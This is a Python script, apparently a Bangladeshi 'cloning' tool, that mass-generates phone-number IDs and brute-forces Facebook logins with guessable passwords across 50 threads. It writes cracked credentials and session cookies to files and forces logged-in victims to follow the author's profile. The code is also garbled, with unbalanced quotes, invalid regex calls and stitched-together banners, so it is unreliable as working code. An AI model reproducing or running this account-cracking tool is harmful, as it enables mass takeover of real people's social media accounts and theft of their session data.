import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\\033[1;91m [✔] Sorry there is no Active  Apk ')

    else:

        print(f'\r \033[1;92m[✔] Your Active Apps :{WHITE}' )

        for i in range(len(game)):

            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\\033[1;91m [✔] Sorry there is no Expired Apk\n')

    else:

        print(f'\\033[1;92m [✔] Your Expired Apps   :{WHITE}')

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://www.facebook.com/takbir.islam.987?mibextid=ZbWKwL', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://mbasic.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.009)

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo ="
╔╗──╔╗
║╚╗╔╝║
╚╗║║╔╩═╦══╦═╗
─║╚╝║║═╣╔╗║╔╝
─╚╗╔╣║═╣╔╗║║
──╚╝╚══╩╝╚╩╝
                                                                                                 
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO 𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚 TOOLS               \033[;0m\033[1;91m\033[1;92m

 

 

\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mTAKBIR COMMAND \033[1;39m━━━━━━━━━━━━━━━━━━━━┓

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑 : TAKBIR\033[1;39m         

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :TAKBIR ISLAM \033[1;39m         

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁  : N1X4T\033[1;39m       

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 : 01327084556\033[1;39m     

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\033[1;39m     

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗣𝗥𝗜𝗠𝗜𝗨𝗠\033[1;39m            


 \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31mWORLD 2.0 \033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""


import os
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')


try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="TAKBIR-XD"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get("https://github.com/N1X4T/BLUE/blob/main/BLUE.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    logo2 ="""

                                               
╔╗──╔╗
║╚╗╔╝║
╚╗║║╔╩═╦══╦═╗
─║╚╝║║═╣╔╗║╔╝
─╚╗╔╣║═╣╔╗║║
──╚╝╚══╩╝╚╩╝                              

 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO 𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚 TOOLS               \033[;0m\033[1;91m\033[1;92m

 

 

\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mTAKBIR COMMAND \033[1;39m━━━━━━━━━━━━━━━━━━━━┓

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑 : vear       

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :vear ahmad 

\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁  : vear.py   
loop = 0

oks = []

cps = []

def clear():

    os.system('clear')

    print(logo)
    
    

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

 

try:

    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m JOIN THE TAKBIR COMMAND WORLD 2.0 PUBLIC GROUP...')

    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m NOTE : AMADER GROUP A KICU CROW NEWA HOBE...')

    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m JARA JOIN HOTE CHAN TARA JOIN HOTE PAREN CRODES FEE SIMITO...')

    time.sleep(3)

    v = 5.3

    update = ('5.3')

    update = ('5.3')

    if str(v) in update:

        os.system('https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL/')

    else:pass vear123

except:print('\n \033[1;91m[\033[1;92m✔\033[1;91m] No internet connection ...')

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

ugen2 = []

ugen = []
def news():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    print(logo)

    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 <<')

    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m CHOOSE GP CODE\033[1;91m>>\033[1;92m ')

    limit = 500000

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    os.system("clear")

    print(logo)

    passx = 0

    RimonID = []

    print("")

    for bilal in range(passx):

        pww = 0

        RimonID.append(pww)

    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m YOUR SLECTED SIM \033[1;91m>>\033[1;96m '+code)

        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)

        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')

        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')

        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

        for love in user:

            pwx = [love[1:]]

            uid = code+love

            for Eman in RimonID:

                pwx.append(Eman)

                pwx.append(love)

            manshera.submit(new,uid,pwx,tl)

    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')

    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in TAKBIR/ok.txt,TAKBIR/cp.txt')

    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

def new(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL').text

            log_data = {

                "lsd":re.search('name="lsd" vear="(.*?)"', str(free_fb)).(1),

            "jazoest":re.search('name="jazoest" vear="(.*?)"', str(free_fb)).(1),

            "m_ts":re.search('name="m_ts" vear="(.*?)"', str(free_fb)).(1),

            "li":re.search('name="li" vear="(.*?)"', str(free_fb)).(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':  'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:85.0) Gecko/20100101 Firefox/85.0',}

            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[65:80]

                print(' \n\x1b[38;5;196m[\x1b[38;5;46mTAKBIR\x1b[38;5;196m]\x1b[38;5;46m ' +uid+ '\x1b[38;5;46m  ✔  \x1b[38;5;46m' +ps+ '\n  COOKIES\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m '+coki+'')                

                open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[65:80]

                print(vear[OK] ' +uid+ '|' +ps+ '')

                open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')

                cps.append(cid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mTAKBIR\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))

        sys.stdout.flush()

    except:

        pass

news()
